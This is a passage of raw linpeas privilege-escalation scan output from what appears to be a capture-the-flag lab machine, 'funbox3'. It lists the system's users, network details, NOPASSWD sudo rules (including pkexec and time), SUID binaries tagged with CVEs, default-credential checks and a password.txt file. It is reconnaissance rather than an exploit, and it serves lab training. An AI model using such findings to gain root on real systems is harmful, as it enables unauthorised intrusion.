denied\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;login-required\u0026#34;}}\rSocket /var/snap/lxd/common/lxd/unix.socket owned by root uses HTTP. Response to /index:\r{\u0026#34;type\u0026#34;:\u0026#34;sync\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;Success\u0026#34;,\u0026#34;status_code\u0026#34;:200,\u0026#34;operation\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;error_code\u0026#34;:0,\u0026#34;error\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;metadata\u0026#34;:[\u0026#34;/1.0\u0026#34;]}\r[+] D-Bus config files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf ( \u0026lt;policy group=\u0026#34;power\u0026#34;\u0026gt;)\r[+] D-Bus Service Objects list\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION\r:1.1 638 systemd-timesyn systemd-timesync :1.1 systemd-timesyncd.service - -\r:1.13 1342 systemd-network systemd-network :1.13 systemd-networkd.service - -\r:1.132 19186 busctl tony :1.132 session-9.scope 9 -\r:1.18 5071 systemd tony :1.18 user@1000.service - -\r:1.2 702 systemd-resolve systemd-resolve :1.2 systemd-resolved.service - -\r:1.4 781 accounts-daemon root :1.4 accounts-daemon.service - -\r:1.5 831 systemd-logind root :1.5 systemd-logind.service - -\r:1.6 1 systemd root :1.6 init.scope - -\r:1.7 811 networkd-dispat root :1.7 networkd-dispatcher.service - -\r:1.8 941 polkitd root :1.8 polkit.service - -\r:1.9 946 unattended-upgr root :1.9 unattended-upgrades.service - -\rcom.ubuntu.LanguageSelector - - - (activatable) - - -\rcom.ubuntu.SoftwareProperties - - - (activatable) - - -\rio.netplan.Netplan - - - (activatable) - - -\rorg.freedesktop.Accounts 781 accounts-daemon root :1.4 accounts-daemon.service - -\rorg.freedesktop.DBus 1 systemd root - init.scope - -\rorg.freedesktop.PackageKit - - - (activatable) - - -\rorg.freedesktop.PolicyKit1 941 polkitd root :1.8 polkit.service - -\rorg.freedesktop.bolt - - - (activatable) - - -\rorg.freedesktop.fwupd - - - (activatable) - - -\rorg.freedesktop.hostname1 - - - (activatable) - - -\rorg.freedesktop.locale1 - - - (activatable) - - -\rorg.freedesktop.login1 831 systemd-logind root :1.5 systemd-logind.service - -\rorg.freedesktop.network1 1342 systemd-network systemd-network :1.13 systemd-networkd.service - -\rorg.freedesktop.resolve1 702 systemd-resolve systemd-resolve :1.2 systemd-resolved.service - -\rorg.freedesktop.systemd1 1 systemd root :1.6 init.scope - -\rorg.freedesktop.thermald - - - (activatable) - - -\rorg.freedesktop.timedate1 - - - (activatable) - - -\rorg.freedesktop.timesync1 638 systemd-timesyn systemd-timesync :1.1 systemd-timesyncd.service - -\r═══════════════════════════════════╣ Network Information ╠════════════════════════════════════ [+] Hostname, hosts and DNS funbox3 127.0.0.1 localhost\r127.0.1.1 funbox3\r::1 ip6-localhost ip6-loopback\rfe00::0 ip6-localnet\rff00::0 ip6-mcastprefix\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\rnameserver 127.0.0.53\roptions edns0\r[+] Content of /etc/inetd.conf \u0026amp; /etc/xinetd.conf\r/etc/inetd.conf Not Found [+] Interfaces\r# symbolic names for networks, see networks(5) for more information link-local 169.254.0.0\rens256: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 192.168.183.111 netmask 255.255.255.0 broadcast 192.168.183.255\rether 00:50:56:ba:bd:f9 txqueuelen 1000 (Ethernet)\rRX packets 429795 bytes 61356105 (61.3 MB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 437442 bytes 178439116 (178.4 MB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rinet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt;\rloop txqueuelen 1000 (Local Loopback)\rRX packets 1229 bytes 105240 (105.2 KB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 1229 bytes 105240 (105.2 KB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\r[+] Networks and neighbours\rKernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface\rdefault _gateway 0.0.0.0 UG 0 0 0 ens256\r192.168.183.0 0.0.0.0 255.255.255.0 U 0 0 0 ens256\rAddress HWtype HWaddress Flags Mask Iface\r_gateway ether 00:50:56:ba:78:c5 C ens256\r[+] Iptables rules\riptables rules Not Found [+] Active Ports\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::33060 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - [+] Can I sniff with tcpdump?\rNo ════════════════════════════════════╣ Users Information ╠════════════════════════════════════ [+] My user [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)\r[+] Do I have PGP keys?\r/usr/bin/gpg netpgpkeys Not Found\rnetpgp Not Found [+] Clipboard or highlighted text?\rxsel and xclip Not Found [+] Checking \u0026#39;sudo -l\u0026#39;, /etc/sudoers, and /etc/sudoers.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for tony on funbox3: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser tony may run the following commands on funbox3:\r(root) NOPASSWD: /usr/bin/yelp\r(root) NOPASSWD: /usr/bin/dmf\r(root) NOPASSWD: /usr/bin/whois\r(root) NOPASSWD: /usr/bin/rlogin\r(root) NOPASSWD: /usr/bin/pkexec\r(root) NOPASSWD: /usr/bin/mtr\r(root) NOPASSWD: /usr/bin/finger\r(root) NOPASSWD: /usr/bin/time\r(root) NOPASSWD: /usr/bin/cancel\r(root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh\r[+] Checking sudo tokens\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens /proc/sys/kernel/yama/ptrace_scope is not enabled (1) gdb wasn\u0026#39;t found in PATH\r[+] Checking doas.conf\r/etc/doas.conf Not Found [+] Checking Pkexec policy\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2 [Configuration]\rAdminIdentities=unix-user:0\r[Configuration]\rAdminIdentities=unix-group:sudo;unix-group:admin\r[+] Superusers\rroot:x:0:0:root:/root:/bin/bash [+] Users with console\rroot:x:0:0:root:/root:/bin/bash tony:x:1000:1000:#:/home/tony:/bin/bash\r[+] All users \u0026amp; groups\ruid=0(root) gid=0(root) groups=0(root) uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=10(uucp) gid=10(uucp) groups=10(uucp)\ruid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)\ruid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)\ruid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)\ruid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)\ruid=103(messagebus) gid=106(messagebus) groups=106(messagebus)\ruid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)\ruid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)\ruid=106(tss) gid=111(tss) groups=111(tss)\ruid=107(uuidd) gid=112(uuidd) groups=112(uuidd)\ruid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)\ruid=109(landscape) gid=115(landscape) groups=115(landscape)\ruid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)\ruid=112(mysql) gid=117(mysql) groups=117(mysql)\ruid=13(proxy) gid=13(proxy) groups=13(proxy)\ruid=2(bin) gid=2(bin) groups=2(bin)\ruid=3(sys) gid=3(sys) groups=3(sys)\ruid=33(www-data) gid=33(www-data) groups=33(www-data)\ruid=34(backup) gid=34(backup) groups=34(backup)\ruid=38(list) gid=38(list) groups=38(list)\ruid=39(irc) gid=39(irc) groups=39(irc)\ruid=4(sync) gid=65534(nogroup) groups=65534(nogroup)\ruid=41(gnats) gid=41(gnats) groups=41(gnats)\ruid=5(games) gid=60(games) groups=60(games)\ruid=6(man) gid=12(man) groups=12(man)\ruid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\ruid=7(lp) gid=7(lp) groups=7(lp)\ruid=8(mail) gid=8(mail) groups=8(mail)\ruid=9(news) gid=9(news) groups=9(news)\ruid=998(lxd) gid=100(users) groups=100(users)\ruid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)\r[+] Login now\r04:45:22 up 2:13, 1 user, load average: 0.43, 0.10, 0.03 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\rtony pts/1 192.168.45.5 04:39 26.00s 0.05s 0.00s /bin/sh ./linpeas.sh\r[+] Last logons\rtony pts/1 Sat May 6 04:39:47 2023 still logged in 192.168.45.5\rreboot system boot Fri Feb 17 19:42:00 2023 still running 0.0.0.0\rreboot system boot Thu Feb 16 08:18:13 2023 still running 0.0.0.0\rreboot system boot Wed Feb 15 19:52:17 2023 still running 0.0.0.0\rreboot system boot Mon Jan 30 14:14:29 2023 still running 0.0.0.0\rwtmp begins Mon Jan 30 14:14:29 2023\r[+] Last time logon each user\rUsername Port From Latest tony pts/1 192.168.45.5 Sat May 6 04:39:47 +0000 2023\r[+] Password policy\rPASS_MAX_DAYS 99999 PASS_MIN_DAYS 0\rPASS_WARN_AGE 7\rENCRYPT_METHOD SHA512\r[+] Do not forget to test \u0026#39;su\u0026#39; as any other user with shell: without password and with their names as password (I can\u0026#39;t do it...) [+] Do not forget to execute \u0026#39;sudo -l\u0026#39; without password or with valid password (if you know it)!! ═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════ [+] MySQL version mysql Ver 8.0.21-0ubuntu0.20.04.3 for Linux on x86_64 ((Ubuntu)) [+] MySQL connection using default root/root ........... No\r[+] MySQL connection using root/toor ................... No [+] MySQL connection using root/NOPASS ................. No [+] Searching mysql credentials and exec From \u0026#39;/etc/mysql/mysql.conf.d/mysqld.cnf\u0026#39; Mysql user: user = mysql Found readable /etc/mysql/my.cnf\r!includedir /etc/mysql/conf.d/\r!includedir /etc/mysql/mysql.conf.d/\r[+] PostgreSQL version and pgadmin credentials\rNot Found [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No\r[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No [+] Apache server info\rVersion: Server version: Apache/2.4.41 (Ubuntu) Server built: 2020-04-13T17:19:17\rPHP exec extensions\r/etc/apache2/mods-available/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(ar|p|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.4.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-available/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.4.conf: SetHandler application/x-httpd-php-source\r--\r/etc/apache2/mods-enabled/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(ar|p|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.4.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-enabled/php7.4.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.4.conf: SetHandler application/x-httpd-php-source\r[+] Searching PHPCookies\rNot Found [+] Searching Wordpress wp-config.php files\rwp-config.php Not Found [+] Searching Drupal settings.php files\r/default/settings.php Not Found [+] Searching Moodle config.php files\rconfig.php inside a moodle folder Not Found [+] Searching Tomcat users file\rtomcat-users.xml Not Found [+] Mongo information\rmongo binary Not Found [+] Searching supervisord configuration file\rsupervisord.conf Not Found [+] Searching cesi configuration file\rcesi.conf Not Found [+] Searching Rsyncd config file\rrsyncd.conf Not Found [+] Searching Hostapd config file hostapd.conf Not Found [+] Searching wifi conns file\rNot Found [+] Searching Anaconda-ks config files\ranaconda-ks.cfg Not Found [+] Searching .vnc directories and their passwd files\r.vnc Not Found [+] Searching ldap directories and their hashes\r/etc/ldap The password hash is from the {SSHA} to \u0026#39;structural\u0026#39;\r[+] Searching .ovpn files and credentials\r.ovpn Not Found [+] Searching ssl/ssh files\rPermitRootLogin prohibit-password ChallengeResponseAuthentication no\rUsePAM yes\rPasswordAuthentication yes\r--\u0026gt; /etc/hosts.allow file found, read the rules:\r/etc/hosts.allow\rSearching inside /etc/ssh/ssh_config for interesting info\rInclude /etc/ssh/ssh_config.d/*.conf\rHost *\rSendEnv LANG LC_*\rHashKnownHosts yes\rGSSAPIAuthentication yes\r[+] Searching unexpected auth lines in /etc/pam.d/sshd\rNo [+] Searching Cloud credentials (AWS, Azure, GC)\r[+] NFS exports?\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe /etc/exports Not Found [+] Searching kerberos conf files and tickets\r[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt tickets kerberos Not Found klist Not Found [+] Searching Kibana yaml\rkibana.yml Not Found [+] Searching Knock configuration\rKnock.config Not Found [+] Searching logstash files\rNot Found [+] Searching elasticsearch files\rNot Found [+] Searching Vault-ssh files\rvault-ssh-helper.hcl Not Found [+] Searching AD cached hashes\rcached hashes Not Found [+] Searching screen sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions No Sockets found in /run/screen/S-tony. [+] Searching tmux sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions tmux Not Found [+] Searching Couchdb directory\r[+] Searching redis.conf\r[+] Searching dovecot files\rdovecot credentials Not Found [+] Searching mosquitto.conf\r[+] Searching neo4j auth file\r[+] Searching Cloud-Init conf file\r[+] Searching Erlang cookie file\r[+] Searching GVM auth file\r[+] Searching IPSEC files\r[+] Searching IRSSI files\r[+] Searching Keyring files\rKeyring folder: /usr/share/keyrings /usr/share/keyrings:\rtotal 32\r-rw-r--r-- 1 root root 2236 Mar 30 2020 ubuntu-advantage-esm-apps.gpg\r-rw-r--r-- 1 root root 2264 Mar 30 2020 ubuntu-advantage-esm-infra-trusty.gpg\r-rw-r--r-- 1 root root 7399 Sep 17 2018 ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 6713 Oct 27 2016 ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 4097 Feb 6 2018 ubuntu-cloudimage-keyring.gpg\r-rw-r--r-- 1 root root 0 Jan 17 2018 ubuntu-cloudimage-removed-keys.gpg\r-rw-r--r-- 1 root root 1227 May 27 2010 ubuntu-master-keyring.gpg\r[+] Searching Filezilla sites file\r[+] Searching backup-manager files\r[+] Searching uncommon passwd files (splunk)\r[+] Searching GitLab related files\r[+] Searching PGP/GPG\rPGP/GPG software: /usr/bin/gpg\rnetpgpkeys Not Found\rnetpgp Not Found [+] Searching vim files\r[+] Checking if containerd(ctr) is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation [+] Checking if runc is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation [+] Searching docker files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket [+] Interesting Firefox Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Interesting Chrome Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Autologin Files\r[+] S/Key authentication\r[+] YubiKey authentication\r[+] Passwords inside pam.d\r[+] FastCGI Params\r[+] SNMPs\r════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found -rwsr-xr-x 1 root root 15K Apr 21 2017 /usr/bin/time -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 427K Mar 4 2019 /snap/core18/1932/usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 427K Mar 4 2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 59K Mar 22 2019 /snap/core18/1932/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 40K Mar 22 2019 /snap/core18/1932/usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 75K Mar 22 2019 /snap/core18/1932/usr/bin/gpasswd -rwsr-xr-x 1 root root 44K Mar 22 2019 /snap/core18/1932/usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /snap/core18/1932/usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 44K Mar 22 2019 /snap/core18/1932/bin/su\r-rwsr-xr-x 1 root root 59K Mar 22 2019 /snap/core18/1885/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 40K Mar 22 2019 /snap/core18/1885/usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 75K Mar 22 2019 /snap/core18/1885/usr/bin/gpasswd -rwsr-xr-x 1 root root 44K Mar 22 2019 /snap/core18/1885/usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /snap/core18/1885/usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 44K Mar 22 2019 /snap/core18/1885/bin/su\r-rwsr-xr-x 1 root root 63K Jun 28 2019 /snap/core18/1932/bin/ping\r-rwsr-xr-x 1 root root 63K Jun 28 2019 /snap/core18/1885/bin/ping\r-rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 23K Aug 16 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 31K Aug 16 2019 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 146K Jan 31 2020 /snap/core18/1932/usr/bin/sudo\r-rwsr-xr-x 1 root root 146K Jan 31 2020 /snap/core18/1885/usr/bin/sudo\r-rwsr-xr-x 1 root root 163K Feb 3 2020 /usr/bin/sudo\r-rwsr-xr-x 1 root root 27K Mar 5 2020 /snap/core18/1885/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 43K Mar 5 2020 /snap/core18/1885/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount\r-rwsr-xr-x 1 root root 39K Apr 2 2020 /usr/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 67K Apr 2 2020 /usr/bin/su\r-rwsr-xr-x 1 root root 55K Apr 2 2020 /usr/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 67K Apr 16 2020 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)\r-rwsr-xr-x 1 root root 44K Apr 16 2020 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 87K Apr 16 2020 /usr/bin/gpasswd\r-rwsr-xr-x 1 root root 52K Apr 16 2020 /usr/bin/chsh\r-rwsr-xr-x 1 root root 84K Apr 16 2020 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 463K May 29 2020 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-- 1 root messagebus 51K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-- 1 root systemd-resolve 42K Jun 11 2020 /snap/core18/1932/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-- 1 root systemd-resolve 42K Jun 11 2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 128K Jul 10 2020 /usr/lib/snapd/snap-confine\r-rwsr-xr-x 1 root root 109K Sep 4 2020 /snap/snapd/9279/usr/lib/snapd/snap-confine\r-rwsr-xr-x 1 root root 27K Sep 16 2020 /snap/core18/1932/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 43K Sep 16 2020 /snap/core18/1932/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 109K Oct 8 2020 /snap/snapd/9721/usr/lib/snapd/snap-confine\r[+] SGID\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at -rwxr-sr-x 1 root shadow 34K Feb 27 2019 /snap/core18/1885/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 34K Feb 27 2019 /snap/core18/1885/sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root crontab 355K Mar 4 2019 /snap/core18/1932/usr/bin/ssh-agent\r-rwxr-sr-x 1 root crontab 355K Mar 4 2019 /snap/core18/1885/usr/bin/ssh-agent\r-rwxr-sr-x 1 root shadow 23K Mar 22 2019 /snap/core18/1932/usr/bin/expiry\r-rwxr-sr-x 1 root shadow 71K Mar 22 2019 /snap/core18/1932/usr/bin/chage\r-rwxr-sr-x 1 root shadow 23K Mar 22 2019 /snap/core18/1885/usr/bin/expiry\r-rwxr-sr-x 1 root shadow 71K Mar 22 2019 /snap/core18/1885/usr/bin/chage\r-rwxr-sr-x 1 root utmp 15K Sep 30 2019 /usr/lib/x86_64-linux-gnu/utempter/utempter -rwxr-sr-x 1 root shadow 43K Dec 17 2019 /usr/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 43K Dec 17 2019 /usr/sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root crontab 43K Feb 13 2020 /usr/bin/crontab\r-rwxr-sr-x 1 root tty 31K Mar 5 2020 /snap/core18/1885/usr/bin/wall\r-rwxr-sr-x 1 root tty 15K Mar 30 2020 /usr/bin/bsd-write\r-rwxr-sr-x 1 root tty 35K Apr 2 2020 /usr/bin/wall\r-rwxr-sr-x 1 root shadow 31K Apr 16 2020 /usr/bin/expiry\r-rwxr-sr-x 1 root shadow 83K Apr 16 2020 /usr/bin/chage\r-rwxr-sr-x 1 root ssh 343K May 29 2020 /usr/bin/ssh-agent\r-rwxr-sr-x 1 root shadow 34K Jul 21 2020 /snap/core18/1932/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 34K Jul 21 2020 /snap/core18/1932/sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root tty 31K Sep 16 2020 /snap/core18/1932/usr/bin/wall\r[+] Checking misconfigurations of ld.so\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so /etc/ld.so.conf include /etc/ld.so.conf.d/*.conf\r/etc/ld.so.conf.d\r/etc/ld.so.conf.d/libc.conf\r/usr/local/lib\r/etc/ld.so.conf.d/x86_64-linux-gnu.conf\r/usr/local/lib/x86_64-linux-gnu\r/lib/x86_64-linux-gnu\r/usr/lib/x86_64-linux-gnu\r[+] Capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities Current capabilities: Current: =\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rShell capabilities:\r0x0000000000000000=\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rFiles with capabilities:\r/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\r/usr/bin/ping = cap_net_raw+ep\r/usr/bin/mtr-packet = cap_net_raw+ep\r/usr/bin/traceroute6.iputils = cap_net_raw+ep\r[+] Users with capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities [+] Files with ACLs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls files with acls in searched folders Not Found [+] .sh files in path\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path /usr/bin/rescan-scsi-bus.sh /usr/bin/gettext.sh\r[+] Unexpected in root\r/lost+found /swap.img\r/lib32\r/libx32\r[+] Files (scripts) in /etc/profile.d/\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files total 44 drwxr-xr-x 2 root root 4096 Jul 30 2020 .\rdrwxr-xr-x 97 root root 4096 Oct 30 2020 ..\r-rw-r--r-- 1 root root 96 Dec 5 2019 01-locale-fix.sh\r-rw-r--r-- 1 root root 1557 Feb 17 2020 Z97-byobu.sh\r-rwxr-xr-x 1 root root 3417 Apr 16 2020 Z99-cloud-locale-test.sh\r-rwxr-xr-x 1 root root 873 Apr 16 2020 Z99-cloudinit-warnings.sh\r-rw-r--r-- 1 root root 825 Apr 10 2020 apps-bin-path.sh\r-rw-r--r-- 1 root root 729 Feb 2 2020 bash_completion.sh\r-rw-r--r-- 1 root root 1003 Aug 13 2019 cedilla-portuguese.sh\r-rw-r--r-- 1 root root 1107 Nov 3 2019 gawk.csh\r-rw-r--r-- 1 root root 757 Nov 3 2019 gawk.sh\r[+] Permissions in init, init.d, systemd, and rc.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d [+] Hashes inside passwd file? ........... No\r[+] Writable passwd file? ................ No [+] Credentials in fstab/mtab? ........... No [+] Can I read shadow files? ............. No [+] Can I read opasswd file? ............. No [+] Can I write in network-scripts? ...... No [+] Can I read root folder? .............. No [+] Searching root files in home dirs (limit 30)\r/home/ /root/\r[+] Searching folders owned by me containing others files on it\r[+] Readable files belonging to root and readable by me but not world readable\r-rw-r----- 1 root adm 526 May 6 02:34 /var/log/apache2/error.log.1 -rw-r----- 1 root adm 411 Feb 17 19:44 /var/log/apache2/error.log.2.gz\r-rw-r----- 1 root adm 9696179 May 6 04:44 /var/log/apache2/error.log\r[+] Modified interesting files in the last 5mins (limit 100)\r/home/tony/.gnupg/crls.d/DIR.txt /home/tony/.gnupg/trustdb.gpg\r/home/tony/.gnupg/pubring.kbx\r/home/tony/snap/lxd/18077/.config/lxc/config.yml\r/home/tony/1.txt\r/var/log/kern.log\r/var/log/auth.log\r/var/log/apache2/access.log\r/var/log/apache2/error.log\r/var/log/journal/92ec3c988921478186aee5c70411b62c/user-1000.journal\r/var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal\r/var/log/syslog\r/var/snap/lxd/common/lxc/local.conf\r/var/snap/lxd/common/lxcfs.pid\r/var/snap/lxd/common/lxd.pid\r/var/snap/lxd/common/state\r[+] Writable log files (logrotten) (limit 100)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation logrotate 3.14.0 Default mail command: /usr/bin/mail\rDefault compress command: /bin/gzip\rDefault uncompress command: /bin/gunzip\rDefault compress extension: .gz\rDefault state file path: /var/lib/logrotate/status\rACL support: yes\rSELinux support: yes\r[+] Files inside /home/tony (limit 20)\rtotal 364 drwxr-xr-x 5 tony tony 4096 May 6 04:45 .\rdrwxr-xr-x 3 root root 4096 Jul 30 2020 ..\r-rw------- 1 tony tony 0 Oct 30 2020 .bash_history\r-rw-r--r-- 1 tony tony 220 Feb 25 2020 .bash_logout\r-rw-r--r-- 1 tony tony 3771 Feb 25 2020 .bashrc\rdrwx------ 2 tony tony 4096 May 6 04:39 .cache\rdrwx------ 4 tony tony 4096 May 6 04:45 .gnupg\r-rw-r--r-- 1 tony tony 807 Feb 25 2020 .profile\r-rw-r--r-- 1 tony tony 0 May 6 04:39 .sudo_as_admin_successful\r-rwxrwxrwx 1 tony tony 0 May 6 04:44 1.txt\r-rwxrwxrwx 1 tony tony 332111 May 5 08:06 linpeas.sh\r-rwxrwxrwx 1 tony tony 70 Jul 31 2020 password.txt\rdrwxr-xr-x 3 tony tony 4096 May 6 04:45 snap\r[+] Files inside others home (limit 20)\r[+] Searching installed mail applications\r[+] Mails (limit 50)\r[+] Backup folders\rdrwxr-xr-x 2 root root 4096 